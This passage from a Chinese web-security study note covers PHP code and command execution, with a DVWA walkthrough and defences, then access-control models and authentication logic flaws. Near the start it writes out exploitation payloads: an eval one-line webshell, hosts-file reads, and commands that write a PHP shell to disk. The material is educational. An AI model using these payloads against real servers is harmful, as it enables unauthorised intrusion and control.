<p><img src="https://pic.imgdb.cn/item/675993d8d0e0a243d4e1d7cc.png"></p>
<ol start="5">
<li>$a($b)</li>
</ol>
<p><img src="https://www.helloimg.com/i/2024/12/11/675996608e36f.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/11/675996a37f8d6.png"></p>
<h5 id="远程命令执行漏洞的利用"><a href="#远程命令执行漏洞的利用" class="headerlink" title="远程命令执行漏洞的利用"></a>远程命令执行漏洞的利用</h5><p>远程命令执行漏洞有以下一些利用方式:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a=@eval($_POST[666]);			//一句话木马</span><br><span class="line">?a=print(_FILE_);				//获取当前绝对路径</span><br><span class="line">?a=var_dump(file_get_contents(&#x27;c:\windows\system32\drivers\etc\hosts’));	//读取文件</span><br><span class="line">?a=var_dump(file_put_contents($_POST[1],$_POST[2]));</span><br><span class="line">1=shell.php&amp;2=&lt;?php phpinfo()?&gt;			//写shell</span><br></pre></td></tr></table></figure>

<ol>
<li>一句话木马</li>
</ol>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a4974d5c6a.png"></p>
<ol start="2">
<li>获取当前绝对路径</li>
</ol>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a4a05b3152.png"></p>
<ol start="3">
<li>读取文件</li>
</ol>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a4a4539832.png"></p>
<ol start="4">
<li>写shell</li>
</ol>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a4aaddd924.png"></p>
<h4 id="4-6-3-系统命令执行"><a href="#4-6-3-系统命令执行" class="headerlink" title="4.6.3 系统命令执行"></a>4.6.3 系统命令执行</h4><ol>
<li>允许系统命令执行的函数有:</li>
</ol>
<ul>
<li>system()</li>
<li>exec()</li>
<li>shell_exec()</li>
<li>passthru(</li>
<li>popen()</li>
<li>反引号</li>
</ul>
<p>（1）system()</p>
<img src="https://www.helloimg.com/i/2024/12/12/675a4c659b84d.png" style="zoom:67%;" />

<p><img src="https://www.helloimg.com/i/2024/12/12/675a51a524829.png"></p>
<p>（2）exec()</p>
<img src="https://www.helloimg.com/i/2024/12/12/675a520a45cea.png" style="zoom:67%;" />

<p><img src="https://www.helloimg.com/i/2024/12/12/675a52565611f.png"></p>
<p>（3）shell_exec()</p>
<img src="https://www.helloimg.com/i/2024/12/12/675a52b3ad5a5.png" style="zoom:67%;" />

<p><img src="https://www.helloimg.com/i/2024/12/12/675a52919b8df.png"></p>
<p>（4）passthru()</p>
<img src="https://www.helloimg.com/i/2024/12/12/675a54a698068.png" style="zoom:67%;" />

<p><img src="https://www.helloimg.com/i/2024/12/12/675a54d78db00.png"></p>
<p>（5）popen()</p>
<img src="https://www.helloimg.com/i/2024/12/12/675a5504efa19.png" style="zoom:67%;" />

<p><img src="https://www.helloimg.com/i/2024/12/12/675a55691a775.png"></p>
<p>需要在原本的代码中写死，popen内的内容</p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a559a19d17.png"></p>
<p>如果popen内容已经写死，那么无论a是多少，都可以输出内容到1.txt中</p>
<p>（6）反引号</p>
<p>与popen类似，在服务器代码中已经写死</p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a569ea3dfe.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a56728176b.png"></p>
<ol start="2">
<li>系统命令执行漏洞有以下一些利用方式：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=type c:\windows\system32\drivers\etc\hosts		//查看文件</span><br><span class="line">?a=cd			//查看当前绝对路径</span><br><span class="line">?a=echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt; E:\xampp\htdocs\php\os\phpinfo.php		//写shell</span><br></pre></td></tr></table></figure>

<p>（1）查看文件</p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a57d979f85.png"></p>
<p>（2）查看当前绝对路径</p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a586c7c31b.png"></p>
<p>（3）写shell</p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a58c0e4d3b.png"></p>
<h4 id="4-6-4-命令执行漏洞及防御"><a href="#4-6-4-命令执行漏洞及防御" class="headerlink" title="4.6.4 命令执行漏洞及防御"></a>4.6.4 命令执行漏洞及防御</h4><h5 id="基于DVWA的命令执行漏洞分析"><a href="#基于DVWA的命令执行漏洞分析" class="headerlink" title="基于DVWA的命令执行漏洞分析"></a>基于DVWA的命令执行漏洞分析</h5><p><img src="https://www.helloimg.com/i/2024/12/12/675a5b111a88c.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a5bf55938e.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a5c57dea19.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a5cbd3c6ad.png"></p>
<p>先过滤&amp;&amp;，但是未找到，接着过滤;，过滤之后，左右&amp;拼接在一起</p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a5d32c4c44.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/12/675a6000f124c.png"></p>
<h5 id="命令执行漏洞防御"><a href="#命令执行漏洞防御" class="headerlink" title="命令执行漏洞防御"></a>命令执行漏洞防御</h5><p>（1）尽量不要执行外部命令</p>
<p>（2）使用<strong>自定义函数</strong>或函数库来替代外部命令的功能</p>
<p>（3）使用escapeshellarg函数来处理命令参数，esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号替换成\‘，双引号替换成\“，分号替换成;</p>
<p>（4）使用safe_mode_exec_dir指定要执行程序的主目录(php.ini)，用safe_mode_exec_dir指定要执行程序的主目录，可以把会使用的命令提前放入此路径内safe_mode &#x3D;On(打开php的安全模式)<br>        safe mode exec dir &#x3D; &#x2F;usr&#x2F;local&#x2F;php&#x2F;bin&#x2F;</p>
<h3 id="第七部分-文件上传漏洞原理与验证"><a href="#第七部分-文件上传漏洞原理与验证" class="headerlink" title="第七部分 文件上传漏洞原理与验证"></a>第七部分 文件上传漏洞原理与验证</h3><h4 id="4-7-1文件上传漏洞概述"><a href="#4-7-1文件上传漏洞概述" class="headerlink" title="4.7.1文件上传漏洞概述"></a>4.7.1文件上传漏洞概述</h4><h4 id="4-7-2文件上传检测与绕过"><a href="#4-7-2文件上传检测与绕过" class="headerlink" title="4.7.2文件上传检测与绕过"></a>4.7.2文件上传检测与绕过</h4><h4 id="4-7-3-Web容器及IIS"><a href="#4-7-3-Web容器及IIS" class="headerlink" title="4.7.3 Web容器及IIS"></a>4.7.3 Web容器及IIS</h4><h4 id="4-7-4-Apache文件解析漏洞"><a href="#4-7-4-Apache文件解析漏洞" class="headerlink" title="4.7.4  Apache文件解析漏洞"></a>4.7.4  Apache文件解析漏洞</h4><h4 id="4-7-5-Nginx解析漏洞"><a href="#4-7-5-Nginx解析漏洞" class="headerlink" title="4.7.5 Nginx解析漏洞"></a>4.7.5 Nginx解析漏洞</h4><h4 id="4-7-6-Tomcat任意文件上传"><a href="#4-7-6-Tomcat任意文件上传" class="headerlink" title="4.7.6 Tomcat任意文件上传"></a>4.7.6 Tomcat任意文件上传</h4><h4 id="4-7-7-文件上传防御"><a href="#4-7-7-文件上传防御" class="headerlink" title="4.7.7 文件上传防御"></a>4.7.7 文件上传防御</h4><h3 id="第八部分-逻辑漏洞原理与验证"><a href="#第八部分-逻辑漏洞原理与验证" class="headerlink" title="第八部分 逻辑漏洞原理与验证"></a>第八部分 逻辑漏洞原理与验证</h3><h4 id="4-8-1-逻辑漏洞概述"><a href="#4-8-1-逻辑漏洞概述" class="headerlink" title="4.8.1 逻辑漏洞概述"></a>4.8.1 逻辑漏洞概述</h4><h5 id="访问控制概述"><a href="#访问控制概述" class="headerlink" title="访问控制概述"></a>访问控制概述</h5><ol>
<li>访问控制</li>
</ol>
<p>​		在某种程度上来说，信息安全就是通过控制如何访问信息资源来防范资源泄露或未经授权修改的工作。</p>
<p>​		访问控制(Access Control)指系统对用户身份及其所属的预先定义的策略组限制其使用数据资源能力的手段。通常用于系统管理员控制用户对服务器、目录、文件等络资源的访问。访问控制是系统保密性、完整性、可用性和合法使用性的重要基础，是网络安全防范和资源保护的关键策略之一，也是主体依据某些控制策略或权限对客体本身或其资源进行的不同授权访问。</p>
<p>​		访问是主体(Subject)和客体(Object)之间的信息流动，访问控制的主要目的是限制访问主体对客体的访问，从而保障数据资源在合法范围内得以有效使用和管理。为了达到上述目的，访问控制需要完成两个任务：识别和确认访问系统的用户、决定该用户可以对某一系统资源进行何种类型的访问。</p>
<p>​		访问控制包含三个要素，即<strong>主体</strong>、<strong>客体</strong>和<strong>访问控制策略</strong>。<br>​		主体(Subject)是指访问中一个发出请求或要求的主动实体，可以是某个用户，也可以是用户启动的程序、进程或设备等;<br>​		客体(Object)是接受其他实体访问的被动实体，凡是可以被操作的信息、资源、对象都可以被看作客体，可以是文件、光盘、数据库等，<br>​		控制策略( Attribution )是主体对客体的访问规则集，限制主体对客体的访问权限</p>
<p>主体访问客体通常需要4个步骤:</p>
<ul>
<li>Identification		—身份标识</li>
<li>Authentication     —身份验证</li>
<li>Authorization       —审计</li>
<li>Accountability      — 授权</li>
</ul>
<ol start="2">
<li>访问控制模型</li>
</ol>
<p>访问控制模型是规定主体如何访问客体的一种架构，目前主要分为三种:</p>
<ul>
<li>自主访问控制(Discretionary Access Control，DAC，大部分使用)</li>
<li>强制访问控制(Mandatory Access Control，MAC)</li>
<li>角色型访问控制(Role-Based Access Control，RBAC)</li>
</ul>
<p>（1）自主访问控制</p>
<p>​		由客体的属主自主的对客体进行管理，自主的决定是否将访问权限授予其他主体。<br>​		该控制模型与所有数据和权限被操作的系统控制不一样，允许用户控制自己的数据的访问权限，根据用户的身份以及他们所属的分组来限制对对象的访问权限。用户可以通过ACL 定义什么人或什么等级的人可以访问什么资源，每一个ACL都包含一个用户和组的列表，以及它们的访问权限。<br>​		缺点:主体权限太大就可能泄露信息;当用户的数量多、管理数据量大时，ACL就会很庞大，不易维护。</p>
<p>（2）强制访问控制</p>
<p>​		安全策略由管理员配置，访问控制由系统实施，安全策略高于一切的存在。该控制模型是非常严格的访问控制模型，起初由政府和军方设计并使用。所有的权限由管理员预定义，并且由操作系统控制，实现了数据的权限分类和用户的权限分类，在验证的时候可以对比用户和数据的权限等级对应关系，从而知道是否有访问权限。<br>​		缺点:管理不便，不够灵活，而且过重强调保密性，对系统连续工作能力、授权的可管理性方面考虑不足。</p>
<p>（3）角色型访问控制</p>
<p>​		使用集中管理的控制方式来决定主体和客体如何交互，更多的用于企业中，根据不同的职位来分配不同的权限。<br>​		用户被分配一个角色，而它只能拥有角色里包含的权限，没有可以绕过的方法，通过	角色分离了工作职责。</p>
<h5 id="逻辑漏洞概述"><a href="#逻辑漏洞概述" class="headerlink" title="逻辑漏洞概述"></a>逻辑漏洞概述</h5><ol>
<li>逻辑漏洞</li>
</ol>
<p>​		随着网络安全法的实施、企业和用户安全意识的提高，Web安全已经成为了重点关注的方向。诸如使用安全开发框架、部署安全防护设备等防护手段的使用，使得网站的常规漏洞越来越少。以SQL注入为例，由于其危害巨大，常年稳居OWASP Top10的第一位，目前很多Web开发框架在底层就直接杜绝的SQL注入问题。<br>​		但“逻辑漏洞”一词现在却更加热门，很可能成为Web漏洞的主战场。之所以称之为“逻辑漏洞”，是因为在代码之后是人的逻辑，人更容易犯错，是编写完程序后随着人的思维理解产生的不足，所以逻辑漏洞一直都在。</p>
<p>​		相比SQL注入、XSS漏洞等传统安全漏洞，SQL注入、XSS等漏洞可以通过安全框架等避免，并且攻击流量非法，对原始程序进行了破坏，防火墙可以检测；所以现在的攻击者更倾向于利用业务逻辑层的应用安全问题，逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破环业务的完整性。一般出现在密码修改(没有旧密码验证)、越权访问、密码找回、交易支付等功能处。而且由于逻辑漏洞产生的流量多数为合法流量，传统的安全防御设备和措施收效甚微，一般的防护手段或设备无法阻止，这类问题往往危害巨大，可能造成了企业的资产损失和名誉受损，所以导致了逻辑漏洞成为了企业防护中的难题。</p>
<ol start="2">
<li>逻辑漏洞的分类</li>
</ol>
<ul>
<li>验证机制缺陷</li>
<li>会话管理缺陷</li>
<li>权限管理缺陷</li>
<li>业务逻辑缺陷</li>
</ul>
<h5 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h5><p>在网络中，身份是区别于其他个体的一种标识，为了与其他个体有所区别，身份必须具有唯一性。网络中，身份不仅仅用于标识一个人，也可以用于标识一个机器、一个物体，甚至一个虚拟的东西(如进程、会话过程等)<br>        网络中的认证不是对某个事物的资质审查，而是对事物真实性的确认。身份认证的目的是鉴别通信中另一端的真实身份，防止伪造和假冒等情况发生。</p>
<p>​		根据身份认证的对象不同，认证手段也不同，但针对每种身份的认证都有很多种不同的方法。</p>
<p>如果被认证的对象是人，则有三类信息可以用于认证：</p>
<ul>
<li>Who knows：某人所知道的内容，这类信息通常理解为口令</li>
<li>Who has：某人所拥有的物品，这类信息包括密码本、密码卡、U盾</li>
<li>Who is：某人的身份，这类信息包括指纹、虹膜、脸型、语音特征等</li>
</ul>
<p>​		一般情况下，对人的认证只需要一种类型的信息即可，如口令(常用于登录网站)指纹(常用语登录电脑和门禁设备)、U盾(常用于网络金融业务)，而用户的身份信息就是该用户的账户名</p>
<p>​		如果被认证的对象是一般的设备，则通常使用“挑战一应答”机制，即认证者发起一个挑战，被认证者进行应答，认证者对应答进行检验，如果符合要求，则通过认证，否则拒绝。<br>​		验证机制是信息系统安全机制中最简单、最前沿的一种机制。最常见的方式是信息系统要求用户提交用户名与密码，正确则允许用户登录，错误即拒绝用户登录。</p>
<h5 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h5><p>​		在人机交互时，会话管理是保持用户的整个会话活动的互动与计算机系统跟踪过程。会话管理分类：<strong>桌面会话管理</strong>、<strong>浏览器会话管理</strong>、<strong>Web服务器的会话管理</strong>。<br>​		<strong>桌面会话管理</strong>器是一个程序，可以保存和恢复桌面会话，桌面会话是所有正在运行的窗口和当前的内容。受会话管理的应用程序，在保存会话的设置时，会话管理器会保存受该会话管理的所有应用程序。如果注销后再次登录，会话管理器会自动启动受该会话管理的应用程序;不受会话管理的应用程序，必须手动启动这些应用程序。</p>
<p>​		<strong>浏览器会话管理</strong>是打开网页浏览器时，用户可以保存所有打开的网页和设定，并在以后恢复他们的日期。为了帮助恢复系统或应用软件崩溃，页面和设置也可以在下次运行恢复。</p>
<p>​		HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。它也可以简单理解为一个用户从登录到退出应用的一段期间。<br>常见的<strong>Web应用会话管理</strong>的方式有以下3种：</p>
<ul>
<li><p>基于server端session的管理方式</p>
</li>
<li><p>cookie-based的管理方式</p>
</li>
<li><p>token-based的管理方式</p>
</li>
<li><p>HTTP协议</p>
<ul>
<li>无连接<ul>
<li>每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接，采用这种方式可以节省传输时间。</li>
</ul>
</li>
<li>无状态<ul>
<li>指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。即我们给服务器发送HTTP请求之后，服务器根据请求，会给我们发送数据过来，但是发送完，不会记录任何信息。</li>
</ul>
</li>
<li>会话<ul>
<li>执行会话最简单、最常见的方式是向每名用户发布一个唯一的会话令牌或标设符，用户在每一个请求中提交这个令牌</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="https://www.helloimg.com/i/2024/12/12/675aefbbc408c.png" style="zoom:67%;" />



<h5 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h5><ol>
<li>权限管理</li>
</ol>
<p>​		权限管理，一般指根据系统设置的安全规则或者安全策略，用户可以访问而且只能访问自己被授权的资源，不多不少。权限管理几乎出现在任何系统里面，只要有用户和密码的系统。很多人常将“用户身份认证”、“密码加密“、“系统管理”等概念与权限管理概念混淆。</p>
<p>​		用户身份认证是用户要告诉系统“我是谁”，不属于权限管理范畴</p>
<p>​		密码加密，隶属用户身份认证领域，不属于权限管理范畴。</p>
<p>​		系统管理，一般是系统的一个模块。而且该模块一般还含有权限管理子模块。系统管理里面的权限管理模块，只是一个操作界面，让管理员能够设置角色等安全策略。系统背后还有很多权限验证逻辑，这些都并不属于该模块。总体来说，该模块相当于给权限管理模块提供了一些数据</p>
<ul>
<li>从控制力度来看，可以将权限管理分为两大类：<ul>
<li>功能级权限管理</li>
<li>数据级权限管理</li>
</ul>
</li>
<li>从控制方向来看，也可以将权限管理分为两大类：<ul>
<li>从系统获取数据，比如查询订单、查询客户资料</li>
<li>向系统提交数据，比如删除订单、修改客户资料</li>
</ul>
</li>
</ul>
<img src="https://www.helloimg.com/i/2024/12/12/675af1833cb59.png" style="zoom:67%;" />





<h5 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h5><p>​		不同的项目有不同的功能，不同的功能需要不同的实现，实现这些核心功能的代码就叫业务逻辑。</p>
<p>​		很多先接触分层结构，然后对每层产生了初步认识。其中，由于表示层和数据访问层的代码职责清晰明确，基本能正确认识。但是，由于接触的分层架构的Demo大多业务极其简单，又基本是CRUD(常说的增删改查)操作集中型的业务，就会狭义的认为业务逻辑基本就是对数据访问简单的封装。</p>
<p>​		业务逻辑广义的认知应该是：软件产品都是在某个领域内实现某些特定业务，所以，软件产品天生应该分解为界面交互部分和业务逻辑部分，其中业务逻辑部分是软件产品的核心，它客观存在于软件产品内部，但是无法对使用者产生直观刺激，因此业务逻辑不能与使用者直接交互。而界面交互部分是业务逻辑与使用者进行交流的接口，使用者，通过界面交互部分，与业务进行交流，从而使得软件产品发挥其作用。</p>
<img src="https://www.helloimg.com/i/2024/12/12/675af2817fb2a.png" style="zoom:67%;" />



<h4 id="4-8-2-验证机制问题"><a href="#4-8-2-验证机制问题" class="headerlink" title="4.8.2 验证机制问题"></a>4.8.2 验证机制问题</h4><h5 id="验证机制-1"><a href="#验证机制-1" class="headerlink" title="验证机制"></a>验证机制</h5><p>​		身份验证是核心防御机制中最薄弱的环节，身份验证机制也是攻击者的主要攻击目标之一。<br>​		验证机制是应用程序防御恶意攻击的中心机制。它处于防御未授权的最前沿，如果用户能够突破那些防御，他们通常能够控制应用程序的全部功能，自由访问其中的数据缺乏安全稳定的验证机制，其他核心安全机制(如会话管理和访问控制)都无法有效实施。<br>​		验证机制最常见的方式是信息系统要求用户提交用户名与密码，正确则允许用户登录，错误则拒绝用户登录。</p>
<p>验证机制问题主要分为两个方面分别为：<strong>设计缺陷</strong>和<strong>执行缺陷</strong></p>
<p><img src="https://www.helloimg.com/i/2024/12/14/675cffb39280a.png"></p>
<p>Web应用程序常用的验证机制有：</p>
<ul>
<li>基于HTML表单的验证(最常用)</li>
<li>多元机制，如组合型密码和物理令牌(多用于安全性要求较高的应用程序比如说提供进行巨额交易服务的私人银行)</li>
<li>客户端SSL证书或智能卡(成本非常昂贵，通常只有那些用户不多的安全性极其重要的应用程序才会使用)</li>
<li>HTTP基本和摘要验证(内网使用较多，建立在域环境及内网对用户的访问控制之上的)</li>
<li>使用NTLM或Kerberos整合windows的验证</li>
<li>第三方验证服务(尚未得到大量使用)</li>
</ul>
<h5 id="验证机制设计缺陷"><a href="#验证机制设计缺陷" class="headerlink" title="验证机制设计缺陷"></a>验证机制设计缺陷</h5><ol>
<li>可预测的用户名</li>
</ol>
<p>​		有些应用程序需要用户注册时用户名符合某一特定规则，比如需要满足“姓名缩写数字”的这种形式，其中数字是为了防止用户名重复，也就是说如果在存在姓名缩写相同的情况下后面要跟数字或者进行数字累加。这种在学校邮箱注册时是比较常见的。通过这种方式攻击者可以很方便的获得大量有效用户名</p>
<ol start="2">
<li>非唯一性用户名</li>
</ol>
<p>​		极少部分的应用程序不要求用户名的唯一性，这就可能造成这样的问题：<br>​		在恰巧有两名用户使用相同的用户名及密码的情况下，应用程序要么阻止第二个用户设置密码，要么允许其设置相同的密码。前者这种情况可能导致第一名用户的密码泄露给第二名用户，这种情况下攻击者如果想获得某个已知用户名对应的密码则可以通过注册功能针对于此用户名使用不同的密码注册，如果应用程序返回禁止注册，那么我们可以推测出此次注册时的密码就是这个用户名对应的密码。后者则可能导致第二名用户可以访问第一名用户的状态。</p>
<ol start="3">
<li>弱口令</li>
</ol>
<p>​		弱口令(Weak Password)指容易被他人猜到的口令，除123456、12345678、admin等常见口令外，生日、姓名、手机号、1qaz@WSX也被称为弱口令。<br>​		为节省攻击成本，通常会适用弱口令字典进行字典攻击</p>
<p><img src="https://www.helloimg.com/i/2024/12/14/675d90ac16ddf.png"></p>
<ol start="4">
<li>密码确认不完善</li>
</ol>
<p>一些应用程序在用户注册设置密码时，出于一些原因往往会对密码进行如下处理</p>
<ul>
<li>截断前n个字符</li>
<li>大小写不敏感</li>
<li>删除特殊字符</li>
</ul>
<p>​		上述操作均会减少应用程序的密码空间，攻击者通过仔细分析应用程序的密码处理规则后，可以适当修改自己的暴破字典从而提高暴破的成功率。</p>
<ol start="5">
<li>可预测的密码</li>
</ol>
<p>​		在像学校，企业这种存在批量注册大量用户需求的应用程序中，经常会为批量用户设置默认密码，这种默认密码可以是相同的也可以是与用户名或者其身份证信息等有关系的。这种情况下攻击者可以通过Google hacking来在公开信息汇总收集大量初始密码，也可以根据默认密码规律推测出大量密码。</p>
<ol start="6">
<li>暴力破解</li>
</ol>
<p>​		暴力破解(Brute Force)，也可称为蛮力攻击，指利用穷举法将所有的可能性一一尝试，理论上可以破解所有密码问题。实际测试中，考虑到攻击成本问题，通常使用字典攻击(Dictionary Attack)，即逐一尝试用户自定义词典中的可能密码(单词或短语)的攻击方式。</p>
<p><img src="https://www.helloimg.com/i/2024/12/14/675d92262d2ea.png"></p>
<p>​		如果应用程序允许用户在登录失败很多次后，仍能继续尝试登录，那么这种情况下此应用可能存在暴破攻击。为了防止暴破攻击，应用程序应该设置用户登录失败次数上限，当用户失败的登录次数达到上限后应用程序应该阻止用户进一步的登录。但是通过前端脚本或者Cookie来统计用户失败的登录次数是不可靠的，因为这些都是攻击者可以接触到并且可以修改的，如果服务器端使用Session来存储用户失败登录的次数这样就可靠的多。除了用户登录次数的统计问题外，如何处理失败登录次数达到上限的用户也是一个需要谨慎处理的问题，如果用户在登录失败很多次后被锁定，但是锁定状态下的用户使用正确密码登录时和使用错误密码登录时Web应用程序的响应信息不同那么此时此应用还是存在暴破漏洞</p>
<p><img src="https://www.helloimg.com/i/2024/12/14/675d92ecec548.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/14/675d931f31e0e.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/14/675d9355c764b.png"></p>
<p><img src="https://www.helloimg.com/i/2024/12/14/675d937fb3616.png"></p>
<ol start="7">
<li>密码重置</li>
</ol>
<p>​		在逻辑漏洞中密码重置问题是比较常见的一种场景，常见于用户修改密码页面、用户找回密码页面等涉及到网站重置密码功能的页面。</p>
<ul>
<li>修改密码</li>
</ul>
<p>​		目前的修改密码的方式大概可以分为两种，第一种是要求用户键入用户名、旧密码、新密码、确认新密码四部分，一些Web应用程序会<u>忽略修改密码处旧密码错误输入次数过多</u>的问题，这就容易被攻击者利用来进行密码暴破；还有一种最不安全的情况就是<u>只需要用户键入用户名、新密码、确认新密码</u>即可更改用户名相应的密码，这种情况下攻击者无需暴破即可获得正确的用户名及密码组合。</p>
<ul>
<li>找回密码</li>
</ul>
<p>​		忘记密码功能往往通过设置一组问题来验证用户身份，比如这些问题可以是“我最喜欢的颜色”，这些问题的答案组合次数相对于密码来说小的多，并且可以通过信息收集工作来提供辅助。攻击者可以收集一组用户名并逐个遍历然后记录相应的问题在其中选择最简单的那个下手可以获得更高的成功率<br>​		忘记密码处可能<u>不会设置错误次数限制</u>从而允许攻击者猜测上述问题的答案<br>​		通常Web应用程序也会设置密码暗示来代替上述问题，这些<u>密码暗示往往能够辅助攻击者猜测密码</u>，有些用户甚至直接把密码设置为密码暗示。攻击者同样可以通过枚举收集到的用户名然后获得一组密码暗示，从而寻找出最容易获得的密码</p>
<p>​		当前Web应用程序可能通过向用户邮箱发送密码重置链接来帮助用户修改密码，这种链接是随机的攻击者很难对其进行猜解。但是有些应用在设计这个逻辑时可能允许Web应用程序将用户密码修复的邮件发送至攻击者，有时邮箱地址并没有直接显示出来而是存储在隐藏的表单中这时<u>攻击者可以将邮箱修改为自己的邮箱</u>。在最差的情况下攻击者可以尝试推测密码重置的URL来重置用户密码</p>
<p>常见密码重置问题</p>
<ul>
<li>用户名枚举：网站反馈多余信息，可猜测用户信息</li>
<li>验证码返回前端处理：可截获、修改</li>
<li>修改Request：用户名、手机号、Cookie等信息可修改</li>
<li>修改Response：操作结果成功&#x2F;失败可修改</li>
<li>暴力破解验证码：验证码长度有限，或验证码未设置可靠的失效时间</li>
<li>拼凑密码重置链接：重置密码链接有规可循</li>
</ul>
<ol start="8">
<li>记住密码</li>
</ol>
<p>​		一些应用程序为了方便用户访问通常会提供“记住密码”的功能，此功能通常仅通过cookie中的某个字段来实现。比如Cookie中会设置一个存储用户名的字段来实现基础我的功能如果这样的话攻击者仅需要<u>随便注册一个用户然后将Cookie中用户名修改为其想要访问用户的用户名即可实现对目标用户的访问</u>。Cookie中还可能通过存储一个ID字段来唯一的标识用户，这种情况下攻击者可以<u>遍历ID从而实现遍历访问用户</u></p>
<ol start="9">
<li>证书分配不安全</li>
</ol>
<p>​		目前很多应用程序在注册时都会要求用户填入邮箱信息，并在稍后发送给用户一封激活邮件，如果邮件中保存有用户的初始用户名及密码并且这种邮件有没有及时的删除，在邮件泄露或者邮箱被攻击者攻破的情况下，则会泄露应用程序的密码。</p>
<p>​		除此之外有些激活URL可能存在某种规律，攻击者可以通过注册，连续地注册用户来观察这种规律，从而推测其他用户的激活URL。</p>
<ol start="10">
<li>证书传输易受攻击</li>
</ol>
<p>​		如果Web应用程序在网络环境中以明文的方式传递证书，那么攻击者则可能通过探、中间人等各种方式获取。</p>
<ol start="11">
<li>异常开放登录机制</li>
</ol>
<p>验证机制在代码实现过程中也可能由于编码者某些疏忽造成安全问题</p>
<ul>
<li><p>使用控制的一个账户执行一次完整、有效的登录。使用拦截代理服务器记录提交的每一份数据、收到的每一个响应</p>
</li>
<li><p>多次重复登录过程，以非常规方式修改提交的数据。比如，对于客户端传送的每个请求参数或Cookie</p>
<ul>
<li>提交一个空字符串</li>
<li>完全删除键值对</li>
<li>提交非常长和非常短的值</li>
<li>提交字符串代替数字或相反</li>
<li>针对某一参数，尝试重复提交相同和不同的值</li>
</ul>
</li>
<li><p>仔细检查应用程序对提交的每个畸形请求的响应，确定任何不同于基本情况的差异</p>
</li>
<li><p>根据这些观察结果调整测试过程。如果某个修改造成行为改变，设法将这个修改与其他更改组合在一起，使应用程序的逻辑达到最大限度</p>
</li>
</ul>
<ol start="12">
<li>多阶段登录机制中的缺陷</li>
</ol>
<p>​		有些对于安全性要求较高的应用可能会采取多阶段登录验证机制，比如一个多阶段验证机制可以有以下三个过程组成</p>
<ul>
<li>提交用户名及密码</li>
<li>响应一个质询，答案可能使PIN中的特殊数字或者一个值得纪念的词</li>
<li>提交物理令牌上的值</li>
</ul>
<p>​		多阶段登录机制确实可以明显的提高登录验证的安全性，但是更多的阶段同样意味着可能潜在有更多的执行缺陷。比如可能存在以下几个常见的缺陷:</p>
<ul>
<li>应用程序认为访问第三阶段的用户已经完成了一二阶段的认证。这种情况下仅拥有部分登录凭证的攻击者可以成功登录</li>
<li>在每个阶段的验证过程中，应用程序会保存相应的标志，比如账户是否过期是否被锁定、是否属于管理员、是否需要完成更多的登录验证阶段。如果攻击者可以在某一个登录阶段接触到上一个阶段设置的标记，那么攻击者可以对这些标记进行修改从而完成一定程度的攻击行为</li>
</ul>
<p>​		应用程序有可能会认为各阶段认证过程中用户的身份都不会发生变化，并且不会在每一个阶段检查用户身份的统一性，那么如果攻击者在第一阶段输入的用户名及密码与后面阶段输入的验证凭证不一致，且应用程序会以两种或三种验证凭证任一对应的用户身份登录的话，这就存在严重的安全问题。这种情况下攻击者只需要知道目标用户的部分验证信息就可以登录，而其他信息则可以通过自己注册获得部分信息，这种攻击的严重程度取决于应用程序用于确定用户身份的验证凭证的易获得度(比如应用程序以第一阶段的用户名及密码来确定身份，那么存在上述缺陷的情况下攻击者可以使用自己的后两个阶段的验证凭证来进行登录，PIN码内容及物理令牌相对于用户名及密码来说更难获得以这种情况下攻击的严重程度比较高</p>
<p>测试多阶段验证机制可以按照以下步骤进行：</p>
<ul>
<li>记录一次有效账户完整的登录过程，并使用代理记录每一阶段的数据</li>
<li>收集那些由服务器返回的且重复提交的数据，这些数据往往放置与Cookie，URL预设参数，隐藏表单字段等位置</li>
<li>对于上述收集到的重复提交的数据试着在另一阶段将其修改为不同的值看看是否能够登录成功</li>
<li>还需要注意任何提交到服务器且不是用户直接输入的数据，这些数据可能是登录进展的状态信息，比如stage2complete&#x3D;True，攻击者可以直接修改这些值进入下一阶段</li>
<li>尝试各种畸形的登录过程</li>
</ul>
